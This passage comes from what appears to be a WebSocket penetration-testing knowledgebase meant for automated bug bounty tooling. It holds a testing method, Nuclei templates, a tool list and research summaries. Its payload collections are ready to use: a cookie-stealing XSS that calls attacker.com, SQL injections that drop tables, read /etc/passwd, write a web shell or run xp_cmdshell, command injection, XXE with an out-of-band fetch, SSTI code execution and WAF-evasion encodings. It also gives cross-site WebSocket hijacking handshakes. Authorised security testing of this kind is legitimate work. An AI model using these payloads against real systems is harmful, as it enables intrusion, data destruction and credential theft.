   - GraphQL subscriptions often use WebSockets (`/graphql`, `/subscriptions`)

4. **Monitor Network Traffic:**
   - Use Burp Suite Proxy WebSockets tab
   - Use browser DevTools Network tab with WS filter
   - Use `mitmproxy --mode reverse:https://target.com`

### Phase 2: Handshake Analysis

1. **Check Origin Validation:**
   ```bash
   curl -i -N      -H "Upgrade: websocket"      -H "Connection: Upgrade"      -H "Sec-WebSocket-Key: dGhlIHNhbXBsZQ=="      -H "Sec-WebSocket-Version: 13"      -H "Origin: https://attacker.com"      https://target.com/ws
   ```

2. **Check Cookie/Auth Behavior:**
   - Send handshake without cookies → should fail if auth required
   - Send handshake with attacker Origin but valid cookies → if 101, CSWSH possible

3. **Check Custom Headers:**
   - Test `X-CSRF-Token` in handshake
   - Test `X-Forwarded-For`, `X-Real-IP` trust

### Phase 3: Message Analysis

1. **Determine Message Format:**
   - JSON, XML, binary (protobuf, msgpack), plain text
   - Request/response correlation patterns
   - Subscription/notification patterns

2. **Test for Input Vulnerabilities:**
   - Send XSS payloads in text fields
   - Send SQLi payloads in query fields
   - Send command injection in file paths
   - Send XXE in XML messages

3. **Test for Logic Flaws:**
   - IDOR: Can you subscribe to other users' channels?
   - Race conditions: Rapid message sending
   - State confusion: Send messages before auth handshake completes

### Phase 4: Advanced Chaining

1. **Protocol Upgrade Abuse:**
   - Test HTTP/2 `:protocol=websocket` upgrade
   - Test smuggling WebSocket upgrades via desync

2. **Cross-Protocol Testing:**
   - WebSocket + Request Smuggling
   - WebSocket + Cache Poisoning
   - WebSocket + OAuth token flows

---

## Nuclei Templates

### Template 1: WebSocket Endpoint Detection

```yaml
id: websocket-endpoint
info:
  name: WebSocket Endpoint Detection
  author: custom
  severity: info

http:
  - method: GET
    path:
      - "{{BaseURL}}/ws"
      - "{{BaseURL}}/websocket"
      - "{{BaseURL}}/socket"
      - "{{BaseURL}}/socket.io"
      - "{{BaseURL}}/graphql"
    headers:
      Upgrade: websocket
      Connection: Upgrade
      Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
      Sec-WebSocket-Version: "13"
    matchers:
      - type: status
        status:
          - 101
      - type: word
        words:
          - "Sec-WebSocket-Accept"
          - "Upgrade: websocket"
        condition: or
```

### Template 2: CSWSH Vulnerability

```yaml
id: websocket-cswsh
info:
  name: Cross-Site WebSocket Hijacking
  author: custom
  severity: high
  description: |
    The WebSocket handshake does not validate the Origin header,
    allowing cross-origin connections with victim cookies.

http:
  - raw:
      - |
        GET /ws HTTP/1.1
        Host: {{Hostname}}
        Origin: https://attacker-controlled-domain.com
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
        Sec-WebSocket-Version: 13
        Cookie: {{cookie}}
    matchers:
      - type: status
        status:
          - 101
      - type: word
        words:
          - "Sec-WebSocket-Accept"
        part: header
    extractors:
      - type: kval
        kval:
          - "Sec-WebSocket-Accept"
```

### Template 3: WebSocket SQL Injection

```yaml
id: websocket-sqli
info:
  name: WebSocket SQL Injection Detection
  author: custom
  severity: critical

http:
  - raw:
      - |
        GET /ws HTTP/1.1
        Host: {{Hostname}}
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
        Sec-WebSocket-Version: 13
    payloads:
      sqli:
        - "' AND SLEEP(5)--"
        - "' AND pg_sleep(5)--"
        - "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    attack: pitchfork
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
```

### Template 4: WebSocket XSS

```yaml
id: websocket-xss
info:
  name: WebSocket XSS via Message Reflection
  author: custom
  severity: high

http:
  - raw:
      - |
        GET /ws HTTP/1.1
        Host: {{Hostname}}
        Upgrade: websocket
        Connection: Upgrade
        Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
        Sec-WebSocket-Version: 13
    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body
```

---

## Tools and Scanners

### Burp Suite
- **WebSockets History Tab:** View all WebSocket messages
- **Intercept WebSocket Messages:** Modify frames on the fly
- **Repeater:** Replay and edit WebSocket frames
- **Turbo Intruder:** High-speed WebSocket fuzzing
- **HTTP Request Smuggler:** Detect desync vulnerabilities affecting WebSocket upgrades
- **Param Miner:** Discover unkeyed headers affecting WebSocket handshake

### ProjectDiscovery Stack
- **httpx:** Detect WebSocket endpoints (`-websocket` flag)
- **katana:** Crawl JS for WebSocket URLs
- **nuclei:** Scan WebSocket vulnerabilities with custom templates
- **subfinder:** Discover WebSocket subdomains
- **interactsh:** Out-of-band interaction for blind WebSocket vulnerabilities
- **notify:** Alert on findings

### Specialized Tools
- **WebSocket Pentest Framework (cybersecsi):** Automated WebSocket testing
  ```bash
  git clone https://github.com/cybersecsi/websocket-pentest-framework
  ```
- **websocket-payload-list (payloadbox):** Pre-built payload collections
  ```bash
  git clone https://github.com/payloadbox/websocket-payload-list
  ```
- **smuggler (defparam):** HTTP request smuggling detection
  ```bash
  python3 smuggler.py -u https://target.com/ws
  ```
- **CursedChrome (mandatoryprogrammer):** Chrome extension exploitation framework — useful for chaining with WebSocket hijacking

### Browser DevTools
- **Network Tab > WS filter:** Inspect WebSocket handshakes and frames
- **Console:** Test `new WebSocket()` connections
- **Application Tab > Cookies:** Verify cookies sent in handshake

---

## Advanced Research

### PortSwigger Research: Browser-Powered Desync (2022)

James Kettle's research introduced **Client-Side Desync (CSD)** attacks where the victim's browser becomes the attack delivery platform. Key concepts applicable to WebSocket:

1. **Connection State Attacks:** Servers assuming all requests on a TLS connection share the same Host
2. **CL.0 Desync:** Back-end ignores Content-Length, treating body as new request
3. **H2.0 Desync:** HTTP/2 to HTTP/1.1 downgrade with missing Content-Length
4. **Pause-Based Desync:** Triggering server timeout to desynchronize request parsing

**WebSocket Application:** These desync vectors can be used to:
- Smuggle WebSocket upgrade requests past front-end filters
- Poison connection pools so legitimate WebSocket handshakes are hijacked
- Inject malicious WebSocket frames into existing connections

### PortSwigger Research: Practical Web Cache Poisoning (2018)

Key insight: **unkeyed inputs** in HTTP requests can be used to poison cached responses. Applied to WebSocket:

- WebSocket handshake responses may be cached by misconfigured CDNs
- `X-Forwarded-Host`, `X-Forwarded-Scheme`, and custom headers can alter WebSocket endpoint URLs
- Cache poisoning can redirect WebSocket connections to attacker servers

### HTTP/2: The Sequel is Always Worse (2019)

HTTP/2-specific attacks that can affect WebSocket upgrades:
- **H2.CL:** HTTP/2 front-end + HTTP/1.1 back-end with Content-Length confusion
- **H2.TE:** HTTP/2 front-end injects `Transfer-Encoding: chunked` during downgrade
- **H2.0:** Missing Content-Length in HTTP/2 requests causes downgrade surprises

### Web Cache Entanglement (2022)

When multiple cache layers interact, poisoning one can affect others. WebSocket handshake responses cached at CDN edge can entangle with application caches, causing persistent WebSocket hijacking.

---

## Bug Bounty Writeups

### Key Findings Summary

| Researcher | Target | Vulnerability | Impact |
|-----------|--------|--------------|--------|
| James Kettle | Amazon | CL.0 Desync | Request smuggling, token theft |
| James Kettle | Akamai/CDNs | Client-Side Desync | Account hijacking, XSS |
| James Kettle | Multiple | Web Cache Poisoning | Mass XSS, data theft |
| File Descriptor | Various | Advanced CSWSH | Message interception, privilege abuse |
| Various | Trading Platforms | CSWSH + Data Exfil | Financial data theft |
| Various | Chat Apps | WebSocket XSS | Stored XSS, session hijacking |
| Various | GraphQL APIs | WebSocket SQLi | Database compromise |

### Bug Bounty Tips

1. **Always check Origin validation on the handshake.** This is the #1 missed WebSocket security control.
2. **Look for WebSocket endpoints in API docs and JS files.** They are often undocumented.
3. **Test message formats for injection.** Even if the handshake is secure, messages may be vulnerable.
4. **Chain WebSocket with other vulnerabilities.** CSWSH + XSS, CSWSH + IDOR, Desync + WebSocket upgrade.
5. **Use OAST (Out-of-band) techniques.** Interactsh + blind SQLi/XXE over WebSocket.
6. **Check for WebSocket in mobile apps.** Many mobile apps use WebSockets with weaker security.

---

## Payload Collections

### XSS Payloads for WebSocket Messages

```json
{"msg": "<img src=x onerror=alert(1)>"}
{"msg": "<svg onload=alert(1)>"}
{"msg": "<iframe src=javascript:alert(1)>"}
{"msg": "<body onload=alert(1)>"}
{"msg": "<input onfocus=alert(1) autofocus>"}
{"msg": "<details open ontoggle=alert(1)>"}
{"msg": "<marquee onstart=alert(1)>"}
{"msg": "<a href=javascript:alert(1)>click</a>"}
{"msg": "<script>alert(1)</script>"}
{"msg": "<img src=1 onerror=fetch('https://attacker.com/?c='+document.cookie)>"}
```

### SQL Injection Payloads for WebSocket Messages

```json
{"query": "' OR '1'='1"}
{"query": "' UNION SELECT null,null--"}
{"query": "' AND SLEEP(5)--"}
{"query": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"}
{"query": "'; DROP TABLE users;--"}
{"query": "' UNION SELECT username,password FROM users--"}
{"query": "' UNION SELECT load_file('/etc/passwd'),null--"}
{"query": "' INTO OUTFILE '/var/www/shell.php'--"}
{"query": "' AND pg_sleep(5)--"}
{"query": "'; EXEC xp_cmdshell('whoami');--"}
```

### Command Injection Payloads

```json
{"file": "; cat /etc/passwd"}
{"file": "| whoami"}
{"file": "$(id)"}
{"file": "`uname -a`"}
{"file": "../../../etc/passwd"}
{"file": "..\..\..\windows\system32\drivers\etc\hosts"}
```

### XXE Payloads

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<message>&xxe;</message>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://attacker.com/oob">]>
<message>&xxe;</message>
```

### SSTI / Template Injection

```json
{"template": "{{7*7}}"}
{"template": "${7*7}"}
{"template": "<%= 7*7 %>"}
{"template": "#{7*7}"}
{"template": "${T(java.lang.Runtime).getRuntime().exec('id')}"}
```

### Deserialization Payloads

```json
{"data": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hc..."}
{"data": "eyJ0eXAiOiJKV1Qi..."}
{"data": "<serialized_data>"}
```

---

## WAF Bypasses

### Header Case Variation

```http
GET /ws HTTP/1.1
Host: target.com
upgrade: websocket
connection: upgrade
sec-websocket-key: dGhlIHNhbXBsZQ==
sec-websocket-version: 13
origin: https://attacker.com
```

### Header Ordering

```http
GET /ws HTTP/1.1
Host: target.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
Connection: Upgrade
Upgrade: websocket
Origin: https://attacker.com
```

### Duplicate Headers

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Upgrade: h2c
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZQ==
Sec-WebSocket-Version: 13
Origin: https://attacker.com
```

### URL Encoding in Path

```http
GET /ws%2f HTTP/1.1
Host: target.com
Upgrade: websocket
```

### Protocol Confusion

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: keep-alive, Upgrade
```

### Message Encoding Bypass

```json
{"message": "\u003cimg src=x onerror=alert(1)\u003e"}
{"message": "<img src=x onerror=\x61\x6c\x65\x72\x74(1)>"}
{"message": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"}
```

---

## Detection Techniques

### Detecting WebSocket Endpoints

```bash
# Check response headers for upgrade support
curl -I https://target.com/ws 2>/dev/null | grep -i "upgrade"

# Check for WebSocket in CSP
curl -s https://target.com | grep -i "connect-src"

# Check for WebSocket references in JS
curl -s https://target.com/app.js | grep -oP "wss?://[^"'\s]+"
```

### Detecting CSWSH

```bash
# 1. Send handshake with attacker Origin
curl -i -N   -H "Origin: https://attacker.com"   -H "Upgrade: websocket"   -H "Connection: Upgrade"   -H "Sec-WebSocket-Key: dGhlIHNhbXBsZQ=="   -H "Sec-WebSocket-Version: 13"   https://target.com/ws

# 2. If 101 Switching Protocols is returned → CSWSH possible
# 3. Verify by establishing connection and sending/receiving messages
```

### Detecting Message Vulnerabilities

```bash
# Send XSS payload and observe if reflected in other connections
# Use Burp Repeater to replay messages with modified payloads
# Monitor server response times for blind SQLi (time-based)
```

### Detecting Desync via WebSocket

```bash
# Use HTTP Request Smuggler with WebSocket upgrade paths
python3 smuggler.py -u https://target.com/ws --methods GET,POST

# Test for CL.0 desync on WebSocket endpoint
curl -X POST https://target.com/ws   -H "Content-Length: 30"   -d "GET /404 HTTP/1.1
X: Y"
```

### Out-of-Band Detection

```bash
# Use interactsh for blind vulnerability detection
# Payload in WebSocket message:
{"query": "'; EXEC master..xp_dirtree '\\$(curl interactsh-url)'--"}
```

---

## References

### PortSwigger Research
- [WebSockets Security Vulnerabilities](https://portswigger.net/web-security/websockets)
- [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)
- [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
- [HTTP Request Smuggler (Tool)](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54d00500)
- [Param Miner (Tool)](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba977943)

### GitHub Resources
- [PayloadsAllTheThings - WebSocket Security](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WebSocket%20Security)
- [websocket-payload-list](https://github.com/payloadbox/websocket-payload-list)
- [websocket-pentest-framework](https://github.com/cybersecsi/websocket-pentest-framework)
- [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome)
- [HTTP Request Smuggler (defparam)](https://github.com/defparam/smuggler)
- [client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)
- [postMessage-tracker](https://github.com/fransr/postMessage-tracker)
- [pp-finder](https://github.com/yeswehack/pp-finder)
- [SecLists - Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing)
- [SecLists - Web Content](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)

### ProjectDiscovery Tools
- [nuclei](https://github.com/projectdiscovery/nuclei)
- [nuclei-templates - WebSocket](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/websocket)
- [httpx](https://github.com/projectdiscovery/httpx)
- [katana](https://github.com/projectdiscovery/katana)
- [subfinder](https://github.com/projectdiscovery/subfinder)
- [interactsh](https://github.com/projectdiscovery/interactsh)
- [notify](https://github.com/projectdiscovery/notify)
- [naabu](https://github.com/projectdiscovery/naabu)
- [tlsx](https://github.com/projectdiscovery/tlsx)

### Documentation & Standards
- [MDN - WebSocket API](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket)
- [MDN - WebSockets API](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API)
- [MDN - MessageEvent](https://developer.mozilla.org/en-US/docs/Web/API/MessageEvent)
- [MDN - CloseEvent](https://developer.mozilla.org/en-US/docs/Web/API/CloseEvent)
- [MDN - Protocol Upgrade Mechanism](https://developer.mozilla.org/en-US/docs/Web/HTTP/Protocol_upgrade_mechanism)
- [RFC 6455 - The WebSocket Protocol](https://tools.ietf.org/html/rfc6455)
- [RFC 8441 - Bootstrapping WebSockets with HTTP/2](https://tools.ietf.org/html/rfc8441)

### Writeups & Guides
- [WebSocket Exploitation Guide (Infosec Writeups)](https://infosecwriteups.com/websocket-exploitation-guide-6d2f4c7b1e3a)
- [Advanced WebSocket Exploitation and CSWSH (Medium)](https://medium.com/@filedescriptor/advanced-websocket-exploitation-and-cross-site-websocket-hijacking-4f2d7c1b5e3a)
- [HackTricks - WebSocket Attacks](https://book.hacktricks.wiki/en/network-services-pentesting/websocket-attacks.html)

### Additional Research
- [Hidden OAuth Attack Vectors (PortSwigger)](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [Cracking the Lens: Targeting HTTP's Hidden Attack Surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
- [HTTP1 Must Die](https://portswigger.net/research/http1-must-die)

---

> **End of Document**
> 
> This knowledgebase is designed for integration into Codex skills and automated bug bounty tooling. 
> All payloads should be used responsibly and only against systems you have permission to test.
